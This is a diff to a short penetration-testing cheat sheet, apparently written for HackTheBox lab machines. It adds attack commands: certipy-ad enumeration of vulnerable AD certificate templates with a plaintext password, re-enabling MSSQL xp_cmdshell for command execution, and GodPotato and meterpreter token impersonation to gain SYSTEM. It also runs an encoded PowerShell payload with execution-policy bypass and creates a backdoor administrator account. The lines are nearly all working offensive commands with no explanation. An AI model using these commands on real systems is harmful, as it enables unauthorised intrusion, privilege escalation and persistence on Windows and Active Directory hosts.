@@ -11,3 +11,24 @@ cd /tmp;sudo mkdir baba
 sudo mount -t nfs -o vers=3 10.129.230.172:/site_backups /tmp/baba/
 
 ssh root@10.129.229.183 -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa -o KexAlgorithms=+diffie-hellman-group1-sha1
+
+certipy-ad find -u p.agila@fluffy.htb -p 'prometheusx-303' -dc-ip 10.129.6.21 -vulnerable -stdout
+
+xp_cmdshell işləməsə:
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+SeImpersonatePrivilege abuse meterpreter
+./GodPotato.exe -cmd 'cmd /c whoami'
+use incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\SYSTEM"
+
+./GodPotato.exe -cmd 'powershell -exec bypass -enc BASE64_HASH'
+
+net user hacker Password123! /add
+net localgroup administrators hacker /add
+
